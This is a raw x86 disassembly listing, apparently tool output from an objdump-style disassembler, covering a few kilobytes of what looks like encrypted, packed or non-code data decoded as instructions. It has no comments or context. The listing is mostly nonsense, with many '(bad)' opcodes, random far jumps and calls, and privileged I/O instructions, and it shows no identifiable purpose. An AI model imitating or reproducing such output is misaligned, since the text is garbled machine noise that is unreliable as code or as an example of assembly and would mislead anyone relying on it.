  41c67e:	jge    0x41c6c2
  41c680:	fsubr  DWORD PTR [eax]
  41c682:	mov    eax,0x24f60bba
  41c687:	inc    edi
  41c688:	sub    eax,0x6b268b55
  41c68d:	js     0x41c6d6
  41c68f:	ror    BYTE PTR [esi+0x2c],0xca
  41c693:	cs popf 
  41c695:	or     ch,BYTE PTR [esi+eax*1-0x33]
  41c699:	outs   dx,BYTE PTR ds:[esi]
  41c69a:	ins    BYTE PTR es:[edi],dx
  41c69b:	sahf   
  41c69c:	rcl    BYTE PTR [esi-0x34d1ddf9],1
  41c6a2:	daa    
  41c6a3:	jmp    0x8d5d:0x71e65c0f
  41c6aa:	pause  
  41c6ac:	aaa    
  41c6ad:	cmp    BYTE PTR gs:[eax+0x70],cl
  41c6b1:	js     0x41c636
  41c6b3:	loop   0x41c6c7
	...
  41c715:	add    dl,bl
  41c717:	add    edx,eax
  41c719:	xchg   bl,bl
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	lahf   
  41c723:	outs   dx,BYTE PTR ds:[esi]
  41c724:	loope  0x41c76f
  41c726:	push   0x2c
  41c728:	add    DWORD PTR [eax],eax
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    bl,al
  41c72f:	jae    0x41c79d
  41c731:	push   esp
  41c732:	mov    edi,0x34250bfa
  41c737:	jo     0x41c72a
  41c739:	add    bl,BYTE PTR [eax]
  41c73b:	adc    BYTE PTR [eax],0x42
  41c73e:	inc    eax
  41c73f:	ins    BYTE PTR es:[edi],dx
  41c740:	mov    bl,0xf1
  41c742:	adc    esp,0x5170d120
  41c748:	push   ds
  41c749:	mov    ah,0xf7
  41c74b:	push   ds
  41c74c:	mov    al,0xb5
  41c74e:	sub    eax,0xd2d04fd0
  41c753:	cmc    
  41c754:	shl    BYTE PTR [ebx+0x626e75d6],0xb9
  41c75b:	es push 0xffffffd8
  41c75e:	and    DWORD PTR [edx-0x36],eax
  41c761:	dec    esi
  41c762:	pop    ebx
  41c763:	or     BYTE PTR [edi],dh
  41c765:	lea    ebx,[edi+0x5f5f2191]
  41c76b:	pop    ss
  41c76c:	in     al,dx
  41c76d:	fild   DWORD PTR [esi+0x791c3db0]
  41c773:	(bad)  
  41c774:	iret   
  41c775:	jle    0x41c7c8
  41c777:	inc    ebp
  41c778:	or     edx,edx
  41c77a:	jle    0x41c7bb
  41c77c:	cmp    BYTE PTR [edx],ah
  41c77e:	or     BYTE PTR [edx+0x5c92b7d0],dl
  41c784:	shl    bl,0xbf
  41c787:	pop    edx
  41c788:	ja     0x41c7aa
  41c78a:	rcl    dl,1
  41c78c:	cmp    esi,eax
  41c78e:	inc    edi
  41c78f:	cwde   
  41c790:	pop    ebx
  41c791:	xor    al,0x29
  41c793:	jne    0x41c744
  41c795:	test   eax,0x83c076c7
  41c79a:	daa    
  41c79b:	in     eax,dx
  41c79c:	push   esi
  41c79d:	and    BYTE PTR [esi],0xf9
  41c7a0:	add    eax,0xa6a4479c
  41c7a5:	lahf   
  41c7a6:	xor    al,0xdd
  41c7a8:	jne    0x41c7b3
  41c7aa:	mov    al,0x8a
  41c7ac:	aaa    
  41c7ad:	push   0xf8212030
  41c7b2:	fcomp  QWORD PTR ss:[esi]
  41c7b5:	(bad)  
  41c7b6:	pop    esp
  41c7b7:	fnstenv cs:[ebp-0x32]
  41c7bb:	and    ebp,DWORD PTR [ecx+0x5dd3e30e]
  41c7c1:	fs lahf 
  41c7c3:	sub    eax,0x277252cf
  41c7c8:	loope  0x41c77d
  41c7ca:	stos   BYTE PTR es:[edi],al
  41c7cb:	jb     0x41c7b9
  41c7cd:	mov    bl,0xf0
  41c7cf:	adc    BYTE PTR [eax],0xe3
  41c7d2:	ficom  DWORD PTR [edx-0x10]
  41c7d5:	and    ecx,DWORD PTR [esi]
  41c7d7:	pop    ss
  41c7d8:	xor    dl,dh
  41c7da:	mov    dl,0x3b
  41c7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7dd:	stos   BYTE PTR es:[edi],al
  41c7de:	pop    ecx
  41c7df:	sbb    esi,DWORD PTR [edx+0x52e2d148]
  41c7e5:	stc    
  41c7e6:	mov    bl,0x4c
  41c7e8:	sahf   
  41c7e9:	lahf   
  41c7ea:	xor    cl,BYTE PTR [eax]
  41c7ec:	shl    DWORD PTR [ecx],cl
  41c7ee:	ins    DWORD PTR es:[edi],dx
  41c7ef:	or     DWORD PTR [esp+eiz*2+0x1],0x5bab77b9
  41c7f7:	lods   al,BYTE PTR ds:[esi]
  41c7f8:	repz out 0xa2,ax
  41c7fc:	mov    ebx,0x867bc000
  41c801:	push   esi
  41c802:	xlat   BYTE PTR ds:[ebx]
  41c803:	jl     0x41c872
  41c805:	xchg   edi,eax
  41c806:	stos   DWORD PTR es:[edi],eax
  41c807:	mov    eax,ds:0x44395442
  41c80c:	dec    ebx
  41c80d:	mov    edi,DWORD PTR [ebp+0x42]
  41c810:	bound  edx,QWORD PTR [ebx-0x80]
  41c813:	push   edi
  41c814:	and    DWORD PTR [edi+0x699cafe0],edx
  41c81a:	dec    esp
  41c81b:	test   DWORD PTR [ecx+0x56],ebx
  41c81e:	call   0x386325ad
  41c823:	dec    edx
  41c824:	dec    ebp
  41c825:	clc    
  41c826:	les    edi,FWORD PTR [esi-0x7f9a4862]
  41c82c:	fwait
  41c82d:	jbe    0x41c8a9
  41c82f:	ins    BYTE PTR es:[edi],dx
  41c830:	sbb    BYTE PTR [esi-0x75],0x8a
  41c834:	cmp    DWORD PTR [eax],eax
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	lock jmp 0x1:0x2d71134d
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    al,dh
  41c8af:	inc    eax
  41c8b0:	push   ss
  41c8b1:	inc    esi
  41c8b2:	(bad)  
  41c8b3:	int    0x50
  41c8b5:	pusha  
  41c8b6:	inc    edx
  41c8b7:	mov    esi,0x29ca87ee
  41c8bc:	in     eax,0xfa
  41c8be:	js     0x41c8cd
  41c8c0:	lods   al,BYTE PTR ds:[esi]
  41c8c1:	icebp  
  41c8c2:	push   es
  41c8c3:	or     al,bh
  41c8c5:	sub    DWORD PTR [edx],esi
  41c8c7:	dec    esi
  41c8c8:	or     BYTE PTR [ecx-0x7d664fde],0x86
  41c8cf:	xchg   ebp,eax
  41c8d0:	sbb    BYTE PTR [ecx+esi*4],cl
  41c8d3:	aas    
  41c8d4:	pop    ebx
  41c8d5:	test   al,0x33
  41c8d7:	mov    ch,0x91
  41c8d9:	test   eax,0x647aa559
  41c8de:	xchg   ecx,eax
  41c8df:	adc    DWORD PTR [esi+0x42f41e76],edx
  41c8e5:	test   DWORD PTR [ebx+0x45],esi
  41c8e8:	xchg   ecx,eax
  41c8e9:	sti    
  41c8ea:	hlt    
  41c8eb:	in     eax,0x37
  41c8ed:	or     cl,0xba
  41c8f0:	xlat   BYTE PTR ds:[ebx]
  41c8f1:	cmc    
  41c8f2:	push   esp
  41c8f3:	push   cs
  41c8f4:	cmp    BYTE PTR [edx+0x17],0x3
  41c8f8:	sbb    eax,0x213f182
  41c8fd:	cdq    
  41c8fe:	sbb    bh,al
  41c900:	lock xchg edi,eax
  41c902:	mov    dh,0xe3
  41c904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c905:	ss and eax,0xa3b71206
  41c90b:	or     DWORD PTR [ebx+0x42],ebx
  41c90e:	cwde   
  41c90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c910:	fsub   st(1),st
  41c912:	lods   al,BYTE PTR ds:[esi]
  41c913:	dec    esp
  41c914:	pop    edx
  41c915:	and    DWORD PTR [ecx-0x29],ecx
  41c918:	dec    eax
  41c919:	push   0x3c
  41c91b:	xchg   ecx,eax
  41c91c:	bound  ebx,QWORD PTR [edi-0x72640607]
  41c922:	xchg   DWORD PTR ds:0xbf02020e,ebp
  41c928:	loopne 0x41c915
  41c92a:	pop    ecx
  41c92b:	in     al,dx
  41c92c:	or     al,0x8e
  41c92e:	dec    eax
  41c92f:	mov    dl,0x14
  41c931:	sti    
  41c932:	push   cs
  41c933:	and    al,0x5f
  41c935:	in     eax,0xe0
  41c937:	lahf   
  41c938:	push   ebx
  41c939:	std    
  41c93a:	cmp    BYTE PTR [ebx+ebx*1],bl
  41c93d:	mov    eax,0x39dc73cc
  41c942:	scas   eax,DWORD PTR es:[edi]
  41c943:	adc    BYTE PTR [eax+eiz*8],ch
  41c946:	push   ds
  41c947:	jge    0x41c995
  41c949:	xor    eax,DWORD PTR ds:0xb1f70081
  41c94f:	dec    ebx
  41c950:	cli    
  41c951:	mov    ebp,cs
  41c953:	aaa    
  41c954:	sbb    dl,BYTE PTR [edx]
  41c956:	loopne 0x41c991
  41c958:	(bad)  
  41c959:	lods   al,BYTE PTR ds:[esi]
  41c95a:	cmp    BYTE PTR [ebx+ebp*4-0x7d8d67db],ch
  41c961:	adc    cl,BYTE PTR [edx+edi*8+0x5e]
  41c965:	or     eax,0xa0378cd3
  41c96a:	xchg   ecx,eax
  41c96b:	lods   al,BYTE PTR ds:[esi]
  41c96c:	dec    ecx
  41c96d:	dec    esi
  41c96e:	xor    dh,BYTE PTR [ebx-0x6f285e79]
  41c974:	push   esi
  41c975:	pop    esp
  41c976:	dec    ebx
  41c977:	sti    
  41c978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c979:	test   ebx,edi
  41c97b:	ds ret 0x2ed0
  41c97f:	je     0x41c993
  41c981:	fnsave [esi]
  41c983:	dec    esi
  41c984:	shl    DWORD PTR [ebx-0x267f6c41],1
  41c98a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c98b:	div    DWORD PTR [esi]
  41c98d:	adc    eax,DWORD PTR [eax-0x14a960ed]
  41c993:	push   esi
  41c994:	stos   BYTE PTR es:[edi],al
  41c995:	mov    dl,0xd4
  41c997:	call   FWORD PTR [ecx+0x51]
  41c99a:	jmp    edx
  41c99c:	outs   dx,BYTE PTR ds:[esi]
  41c99d:	outs   dx,BYTE PTR ds:[esi]
  41c99e:	pcmpeqw mm5,mm4
  41c9a1:	mov    edx,0xb4e02050
  41c9a6:	push   ebp
  41c9a7:	pop    edi
  41c9a8:	sub    eax,0x36860818
  41c9ad:	push   0xf05f26b4
  41c9b2:	jns    0x41c9c3
  41c9b4:	jo     0x41c9b6
	...
  41ca16:	lock retf 0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0x9a874f42
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [ecx-0x62],dh
  41ca30:	sbb    dl,BYTE PTR [esi]
  41ca32:	push   eax
  41ca33:	mov    ebx,0xac911c8f
  41ca38:	int3   
  41ca39:	sub    BYTE PTR [edi-0x7edab4c4],cl
  41ca3f:	in     eax,dx
  41ca40:	or     eax,0x62c7a24c
  41ca45:	and    al,0xd9
  41ca47:	push   esp
  41ca48:	push   cs
  41ca49:	mov    eax,0xb21d6795
  41ca4e:	add    dl,BYTE PTR [edx+edi*1+0x5ea78f53]
  41ca55:	mov    eax,0x1f96504d
  41ca5a:	and    DWORD PTR [eax+0x8],ebp
  41ca5d:	aas    
  41ca5e:	lea    ebp,[ebp-0x1d]
  41ca61:	es call 0xca95:0x6f6a2920
  41ca69:	into   
  41ca6a:	sbb    BYTE PTR [ebx],bl
  41ca6c:	mov    DWORD PTR [esi+0x16],edx
  41ca6f:	or     DWORD PTR [eax+ebx*2-0x6],esi
  41ca73:	mov    edi,0x8d0deac9
  41ca78:	stos   DWORD PTR es:[edi],eax
  41ca79:	in     eax,0x46
  41ca7b:	inc    esp
  41ca7c:	sub    esp,edx
  41ca7e:	push   esp
  41ca7f:	dec    ebp
  41ca80:	jbe    0x41ca55
  41ca82:	mov    esp,0x2ab88df4
  41ca87:	sar    BYTE PTR [ebx-0x14f140b5],0xfe
  41ca8e:	sbb    esi,edi
  41ca90:	mov    ds:0xe9a2b852,al
  41ca95:	jmp    0xbb7ae5aa
  41ca9a:	cmp    al,ah
  41ca9c:	inc    ebx
  41ca9d:	xchg   esi,eax
  41ca9e:	sbb    eax,0xdc3ad743
  41caa3:	popa   
  41caa4:	jge    0x41ca63
  41caa6:	aad    0xbb
  41caa8:	add    DWORD PTR [edi-0x3c],0x23cb9d4f
  41caaf:	mov    al,0x80
  41cab1:	pop    es
  41cab2:	popa   
  41cab3:	xor    esp,edx
  41cab5:	fiadd  WORD PTR [ebx-0x1]
  41cab8:	imul   ecx,DWORD PTR [edx+0x4783e063],0x9782a134
  41cac2:	lods   eax,DWORD PTR ds:[esi]
  41cac3:	and    al,0x4c
  41cac5:	mov    bl,0x53
  41cac7:	lods   eax,DWORD PTR ds:[esi]
  41cac8:	mov    bh,0xaf
  41caca:	retf   
  41cacb:	test   DWORD PTR [ebp-0x51],edx
  41cace:	pop    es
  41cacf:	add    al,0x9e
  41cad1:	xor    eax,0x9e57190
  41cad6:	mov    ch,0x78
  41cad8:	imul   DWORD PTR [edi-0x55]
  41cadb:	aas    
  41cadc:	(bad)  
  41cadd:	cmp    al,0xde
  41cadf:	and    al,0x74
  41cae1:	adc    BYTE PTR [ebx],dl
  41cae3:	clc    
  41cae4:	cmp    esp,DWORD PTR [esi]
  41cae6:	jecxz  0x41cb37
  41cae8:	loope  0x41cb4b
  41caea:	dec    edi
  41caeb:	xchg   esi,eax
  41caec:	mov    eax,ds:0x84549c71
  41caf1:	aad    0x3
  41caf3:	or     ebx,edx
  41caf5:	mov    edi,0xae9853ad
  41cafa:	sbb    esi,DWORD PTR [ebx-0x46]
  41cafd:	into   
  41cafe:	(bad)  
  41caff:	jnp    0x41cae2
  41cb01:	jg     0x41cb1c
  41cb03:	cmp    al,0x40
  41cb05:	mov    esi,0x676853b8
  41cb0a:	adc    eax,0x499b1618
  41cb0f:	lahf   
  41cb10:	sti    
  41cb11:	addr16 call 0x5903edd9
  41cb17:	mov    DWORD PTR [edx],ebx
  41cb19:	push   eax
  41cb1a:	adc    cl,BYTE PTR [esi+eax*1]
  41cb1d:	js     0x41cb96
  41cb1f:	sub    dl,BYTE PTR [ecx+eiz*4-0x7e]
  41cb23:	lahf   
  41cb24:	jne    0x41cb2b
  41cb26:	mov    esi,0x8daf1f25
  41cb2b:	mov    bl,BYTE PTR [ebx+0x6aabd907]
  41cb31:	cmp    dh,bh
  41cb33:	ins    BYTE PTR es:[edi],dx
  41cb34:	ja     0x41cb36
	...
  41cb96:	sub    esi,edx
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0x623dc3b4]
  41cba3:	mov    bh,0x9f
  41cba5:	dec    ecx
  41cba6:	jg     0x41cbd7
  41cba8:	add    DWORD PTR [eax],eax
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    cl,bh
  41cbaf:	fadd   QWORD PTR [ecx+0xeddd0eb]
  41cbb5:	outs   dx,DWORD PTR ds:[esi]
  41cbb6:	cmp    BYTE PTR [eax],0x3d
  41cbb9:	push   ebx
  41cbba:	sub    BYTE PTR [edx-0x8],0x8c
  41cbbe:	adc    DWORD PTR [esi+0x134253a1],0x6ec3d591
  41cbc8:	push   esp
  41cbc9:	scas   al,BYTE PTR es:[edi]
  41cbca:	jge    0x41cc25
  41cbcc:	add    eax,0x1d04f2a1
  41cbd1:	sub    al,0x77
  41cbd3:	stos   BYTE PTR es:[edi],al
  41cbd4:	jg     0x41cbb8
  41cbd6:	retf   
  41cbd7:	mov    dh,0xd5
  41cbd9:	dec    edi
  41cbda:	das    
  41cbdb:	jl     0x41cc23
  41cbdd:	js     0x41cbd4
  41cbdf:	sbb    DWORD PTR [edx+ebp*4+0x52],0xbad03d71
  41cbe7:	arpl   WORD PTR [edx-0x3a8a4fa0],ax
  41cbed:	dec    ebp
  41cbee:	pop    es
  41cbef:	inc    ecx
  41cbf0:	dec    edx
  41cbf1:	(bad)
  41cbf5:	pop    edx
  41cbf6:	or     ch,BYTE PTR [ecx-0x629e45e]
  41cbfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbfd:	mov    BYTE PTR [ecx+0x2e5fccfa],ch
  41cc03:	call   0x6d3101d4
  41cc08:	sbb    al,0xf
  41cc0a:	imul   ebp,DWORD PTR [eax+0x0],0x50
  41cc0e:	push   esp
  41cc0f:	sbb    bh,BYTE PTR [esi+0x1]
  41cc12:	in     eax,0xc2
  41cc14:	or     ebp,edi
  41cc16:	jno    0x41cbc0
  41cc18:	jg     0x41cc7a
  41cc1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc1b:	popf   
  41cc1c:	lods   al,BYTE PTR ds:[esi]
  41cc1d:	cmp    al,0xa8
  41cc1f:	pop    eax
  41cc20:	stc    
  41cc21:	or     cl,bl
  41cc23:	rcl    DWORD PTR [eax],1
  41cc25:	pop    esi
  41cc26:	and    BYTE PTR [edi],bl
  41cc28:	mov    ?,WORD PTR [esi]
  41cc2a:	cmp    eax,0xb241069e
  41cc2f:	xchg   esi,eax
  41cc30:	push   cs
  41cc31:	mov    dl,0xec
  41cc33:	mov    WORD PTR [esi],es
  41cc35:	out    dx,eax
  41cc36:	and    eax,edi
  41cc38:	mov    al,0xda
  41cc3a:	imul   eax,DWORD PTR [ecx+0x2cb80a5a],0x94dc5ed3
  41cc44:	cmc    
  41cc45:	std    
  41cc46:	imul   eax,DWORD PTR [esi+eax*8+0x62],0xaf8aecc
  41cc4e:	aaa    
  41cc4f:	add    ah,BYTE PTR [edi-0x7d]
  41cc52:	in     al,0x48
  41cc54:	aad    0x6b
  41cc56:	ss mov esi,0x4dac57e6
  41cc5c:	mov    ebp,0x50ca18fa
  41cc61:	or     esp,DWORD PTR [ecx+0x16]
  41cc64:	in     al,dx
  41cc65:	mov    ebx,0x455e8d94
  41cc6a:	retf   
  41cc6b:	sbb    eax,0xeed53820
  41cc70:	xlat   BYTE PTR ds:[ebx]
  41cc71:	and    DWORD PTR [ebp+0x492d8a5a],ebx
  41cc77:	ror    DWORD PTR [esi-0x7af70be9],0x9d
  41cc7e:	add    esi,DWORD PTR [edx-0x7ec771f7]
  41cc84:	lahf   
  41cc85:	clc    
  41cc86:	xchg   ebx,eax
  41cc87:	jne    0x41cca6
  41cc89:	(bad)  
  41cc8a:	sbb    DWORD PTR [edi],ecx
  41cc8c:	rcr    bl,1
  41cc8e:	fs in  al,dx
  41cc90:	and    esp,DWORD PTR [esp+eiz*2-0x1dd6a84f]
  41cc97:	loopne 0x41cc5e
  41cc99:	pop    ebp
  41cc9a:	mov    ds:0xdfa4a1af,al
  41cc9f:	push   esp
  41cca0:	ret    
  41cca1:	es loopne 0x41cc2c
  41cca4:	iret   
  41cca5:	xlat   BYTE PTR ds:[ebx]
  41cca6:	scas   eax,DWORD PTR es:[edi]
  41cca7:	mov    ds:0xa8ea7d63,al
  41ccad:	std    
  41ccae:	mov    BYTE PTR [edx],al
  41ccb0:	fisttp WORD PTR [edi+0xb0466]
	...
  41cd16:	pusha  
  41cd17:	cdq    
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	fs (bad) 
  41cd25:	add    eax,DWORD PTR [esi+0x7000130]
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    dh,al
  41cd2f:	cld    
  41cd30:	stc    
  41cd31:	in     eax,0x97
  41cd33:	stos   BYTE PTR es:[edi],al
  41cd34:	js     0x41cd06
  41cd36:	inc    ebx
  41cd37:	(bad)  
  41cd38:	ficom  DWORD PTR [esi]
  41cd3a:	jnp    0x41cd42
  41cd3c:	jae    0x41cd94
  41cd3e:	mov    WORD PTR [ebp+ecx*2-0x1c],es
  41cd42:	add    DWORD PTR [ebx+0x20],esi
  41cd45:	call   0xd5bc28ff
  41cd4a:	stos   DWORD PTR es:[edi],eax
  41cd4b:	add    al,0x3f
  41cd4d:	in     al,dx
  41cd4e:	xor    ah,BYTE PTR [edi]
  41cd50:	stc    
  41cd51:	pop    ebx
  41cd52:	sbb    DWORD PTR [eax-0x44],eax
  41cd55:	into   
  41cd56:	push   ss
  41cd57:	ret    0xd9b5
  41cd5a:	adc    eax,0x5e3dd8c9
  41cd5f:	push   ebx
  41cd60:	in     al,dx
  41cd61:	call   0xea80c24d
  41cd66:	cmp    DWORD PTR [ebx],esi
  41cd68:	sub    al,0xbd
  41cd6a:	fsubr  st,st(1)
  41cd6c:	jg     0x41cd1f
  41cd6e:	(bad)  
  41cd6f:	ror    BYTE PTR [ecx+esi*1],cl
  41cd72:	jnp    0x41cd85
  41cd74:	pop    ebp
  41cd75:	outs   dx,DWORD PTR ds:[esi]
  41cd76:	pop    edx
  41cd77:	pop    edi
  41cd78:	(bad)  
  41cd79:	in     eax,dx
  41cd7a:	fiadd  WORD PTR [esp+ebp*8-0x6a]
  41cd7e:	test   cl,bh
  41cd80:	ja     0x41cd3e
  41cd82:	jb     0x41cd8d
  41cd84:	ret    0x7a21
  41cd87:	mov    esp,0xe3bb5eec
  41cd8c:	stc    
  41cd8d:	fnsave [ecx+ebx*8]
  41cd90:	ins    BYTE PTR es:[edi],dx
  41cd91:	(bad)  
  41cd92:	mov    ds:0x27bf15a7,al
  41cd97:	jge    0x41cd24
  41cd99:	mov    ds:0x10e899bd,al
  41cd9e:	and    DWORD PTR [esi+edi*2-0x44],0x1d
  41cda3:	mov    ch,0xea
  41cda5:	adc    al,0xc2
  41cda7:	cld    
  41cda8:	and    cl,BYTE PTR [ecx-0xb1fc854]
  41cdae:	dec    esi
  41cdaf:	adc    BYTE PTR [esi+0xb],dh
  41cdb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdb3:	push   ebx
  41cdb4:	cmp    al,0x76
  41cdb6:	repz cs jo 0x41cdb0
  41cdba:	jbe    0x41cd9d
  41cdbc:	(bad)  
  41cdbd:	jae    0x41cd7c
  41cdbf:	clc    
  41cdc0:	and    bh,BYTE PTR [esi+eax*2+0x12]
  41cdc4:	pop    es
  41cdc5:	test   WORD PTR [edi+0x72],dx
  41cdc9:	outs   dx,BYTE PTR ds:[esi]
  41cdca:	push   ebx
  41cdcb:	and    bh,BYTE PTR [ecx]
  41cdcd:	lods   eax,DWORD PTR ds:[esi]
  41cdce:	cwde   
  41cdcf:	mov    al,0x3f
  41cdd1:	mov    ds:0x68ea53f0,eax
  41cdd6:	xchg   ebx,eax
  41cdd7:	pop    eax
  41cdd8:	loopne 0x41cdcd
  41cdda:	jns    0x41ce2c
  41cddc:	(bad)  
  41cddd:	retf   0xebbc
  41cde0:	inc    ecx
  41cde1:	emms   
  41cde3:	mov    eax,ds:0x4d00e4d9
  41cde8:	and    ah,BYTE PTR [edx]
  41cdea:	mov    edx,0xc250cde9
  41cdef:	mov    ch,0x5b
  41cdf1:	push   edx
  41cdf2:	test   BYTE PTR [edi-0x75],0x9e
  41cdf6:	xlat   BYTE PTR ds:[ebx]
  41cdf7:	add    esi,DWORD PTR [ecx+0x313f8a00]
  41cdfd:	sti    
  41cdfe:	pop    esp
  41cdff:	cmp    al,0x9c
  41ce01:	and    bl,bh
  41ce03:	loope  0x41ce43
  41ce05:	xor    bh,BYTE PTR [edx-0x51852648]
  41ce0b:	imul   ebx,eax,0x66
  41ce0e:	cmp    edi,DWORD PTR [edx+0x563879ad]
  41ce14:	push   ebx
  41ce15:	test   eax,0xa19c46a0
  41ce1a:	imul   edi,DWORD PTR [edi-0x3bf7eec3],0x724d4d71
  41ce24:	(bad)  
  41ce25:	std    
  41ce26:	cs push cs
  41ce28:	sbb    esi,ebx
  41ce2a:	imul   ecx,DWORD PTR [esi+0x6916fde6],0xc3972365
  41ce34:	xlat   BYTE PTR ds:[ebx]
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0xbbdaca21
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [edi],ah
  41ceaf:	jno    0x41cea9
  41ceb1:	push   esp
  41ceb2:	dec    ecx
  41ceb3:	bound  ebx,QWORD PTR [edi+0x5c]
  41ceb6:	int3   
  41ceb7:	pop    eax
  41ceb8:	mov    ebx,0xed1ca98a
  41cebd:	jae    0x41cf1a
  41cebf:	das    
  41cec0:	lahf   
  41cec1:	sub    BYTE PTR [ebx],bh
  41cec3:	pop    ebx
  41cec4:	or     ah,BYTE PTR [edx]
  41cec6:	mov    eax,ds:0x33539e7e
  41cecb:	iret   
  41cecc:	pop    ebx
  41cecd:	int3   
  41cece:	xchg   esi,eax
  41cecf:	jp     0x41cf02
  41ced1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ced2:	mul    BYTE PTR [edx-0x7bb0dbe]
  41ced8:	cld    
  41ced9:	hlt    
  41ceda:	inc    esi
  41cedb:	jnp    0x41cf11
  41cedd:	jo     0x41cf35
  41cedf:	inc    edx
  41cee0:	push   ebx
  41cee1:	xchg   ebx,eax
  41cee2:	shl    DWORD PTR [eax+0x18],cl
  41cee5:	xchg   esi,eax
  41cee6:	in     al,0xae
  41cee8:	shr    dl,cl
  41ceea:	push   esi
  41ceeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceed:	(bad)  
  41ceef:	repnz adc ebx,edi
  41cef2:	xor    eax,DWORD PTR [edx]
  41cef4:	sbb    al,0x9f
  41cef6:	xor    DWORD PTR ds:0x8b5b2bf2,edi
  41cefc:	sub    DWORD PTR ds:0x18f4e3b5,edi
  41cf02:	push   ds
  41cf03:	push   es
  41cf04:	stc    
  41cf05:	in     al,dx
  41cf06:	sbb    ebp,DWORD PTR [ecx]
  41cf08:	dec    ecx
  41cf09:	inc    eax
  41cf0a:	pop    edi
  41cf0b:	xor    BYTE PTR ds:0x17d13b29,cl
  41cf11:	in     eax,0x81
  41cf13:	adc    eax,DWORD PTR [esi]
  41cf15:	hlt    
  41cf16:	add    DWORD PTR [eax-0x73b0e4da],eax
  41cf1c:	mov    DWORD PTR [eax+ebp*4-0x13bee6fd],ebx
  41cf23:	push   es
  41cf24:	in     eax,dx
  41cf25:	adc    al,0x24
  41cf27:	out    dx,al
  41cf28:	sbb    BYTE PTR [ebx+0x250990b6],0x90
  41cf2f:	(bad)  
  41cf31:	call   0x8b8a79fd
  41cf36:	inc    esp
  41cf37:	adc    BYTE PTR [ebx+0x2e],bl
  41cf3a:	mov    ch,0x4e
  41cf3c:	sbb    ecx,0xffffff8a
  41cf3f:	mov    ecx,DWORD PTR [eax+0x50]
  41cf42:	cmp    BYTE PTR [ebx+0x6b],dl
  41cf45:	adc    ebx,edx
  41cf47:	xlat   BYTE PTR ds:[ebx]
  41cf48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf49:	add    BYTE PTR [edx],dh
  41cf4b:	or     ecx,ebx
  41cf4d:	jmp    0xb0c74ab1
  41cf52:	addr16 xchg esp,eax
  41cf54:	pop    ebp
  41cf55:	dec    esp
  41cf56:	enter  0x38cb,0x7f
  41cf5a:	dec    edi
  41cf5b:	retf   0x5a67
  41cf5e:	jae    0x41cf06
  41cf60:	mov    edx,0xfda3113b
  41cf65:	cmp    esp,DWORD PTR [edx+0x72]
  41cf68:	mov    edi,0xb7f60b26
  41cf6d:	xlat   BYTE PTR ds:[ebx]
  41cf6e:	cmp    BYTE PTR [eax-0x3334dd38],dh
  41cf74:	add    BYTE PTR [ebx],0xd
  41cf77:	(bad)  
  41cf78:	mulps  xmm6,XMMWORD PTR [ecx+0x777f5e58]
  41cf7f:	xchg   esp,eax
  41cf80:	icebp  
  41cf81:	inc    esp
  41cf82:	xchg   edi,eax
  41cf83:	add    BYTE PTR [ecx+ebp*8-0x29e73a83],dl
  41cf8a:	and    esp,ebx
  41cf8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf8d:	add    eax,0x61c1271f
  41cf92:	sbb    eax,0x442ba7c7
  41cf97:	inc    edi
  41cf98:	mov    dl,0x5a
  41cf9a:	and    cl,dh
  41cf9c:	xchg   esi,eax
  41cf9d:	popf   
  41cf9e:	sahf   
  41cf9f:	xlat   BYTE PTR ds:[ebx]
  41cfa0:	or     al,BYTE PTR [esi-0x4b693c91]
  41cfa6:	xor    al,0x93
  41cfa8:	xlat   BYTE PTR ds:[ebx]
  41cfa9:	inc    edx
  41cfaa:	dec    DWORD PTR [ebx+0x2f]
  41cfad:	ds push 0x3fe777
  41cfb3:	jl     0x41cfa1
	...
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	adc    BYTE PTR [eax],al
  41d024:	push   0x4
  41d026:	xchg   esp,eax
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
